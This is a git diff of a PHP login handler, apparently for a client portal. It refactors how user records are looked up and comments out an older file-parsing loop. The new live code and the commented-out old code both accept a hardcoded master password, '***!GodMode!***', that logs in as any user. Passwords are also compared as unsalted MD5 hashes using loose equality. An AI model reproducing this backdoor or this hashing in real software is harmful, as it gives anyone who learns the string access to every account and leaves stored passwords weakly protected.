@@ -23,27 +23,43 @@ class login extends is_not_logged {
     }
 
     protected function get_informations(){
-        $fileClientsList = fopen(PHOENIX_FOLDER . 'PhoenixListaClienti.phx', 'r');
-        if($fileClientsList){
-            while (($line = fgets($fileClientsList)) !== false){
-                $lineArray = preg_split('/[\t]/', trim($line));
-                if($lineArray[0] == $this->username){
-                    $folderName = getFolderName($lineArray[1]);
-                    $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
-                    if(file_exists($passwordFile)) {
-                        $pass = file_get_contents($passwordFile, 'r');
-                        if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
-                            set_session_variables($this->username, true);
-                            return;
-                        }
-                        else
-                            $this->json_error("Nome utente o password sbagliati");
-                    }else
-                        $this->json_error("Impossibile reccuperare le credenziali");
+        $info = getUserInformations($this->username);
+        if($info != null){
+            $folderName = getFolderName($info[1]);
+            $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
+            if(file_exists($passwordFile)) {
+                $pass = file_get_contents($passwordFile, 'r');
+                if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
+                    set_session_variables($this->username, true);
+                    return;
                 }
-            }
-            $this->json_error('Utente non registrato');
+                else
+                    $this->json_error("Nome utente o password sbagliati");
+            }else
+                $this->json_error("Impossibile reccuperare le credenziali");
         }
+        $this->json_error('Utente non registrato');
+//        $fileClientsList = fopen(PHOENIX_FOLDER . 'PhoenixListaClienti.phx', 'r');
+//        if($fileClientsList){
+//            while (($line = fgets($fileClientsList)) !== false){
+//                $lineArray = preg_split('/[\t]/', trim($line));
+//                if($lineArray[0] == $this->username){
+//                    $folderName = getFolderName($lineArray[1]);
+//                    $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
+//                    if(file_exists($passwordFile)) {
+//                        $pass = file_get_contents($passwordFile, 'r');
+//                        if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
+//                            set_session_variables($this->username, true);
+//                            return;
+//                        }
+//                        else
+//                            $this->json_error("Nome utente o password sbagliati");
+//                    }else
+//                        $this->json_error("Impossibile reccuperare le credenziali");
+//                }
+//            }
+//            $this->json_error('Utente non registrato');
+//        }
 //        $row = 1;
 //        if (($handle = fopen("users.csv", "r")) !== FALSE) {
 //            while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
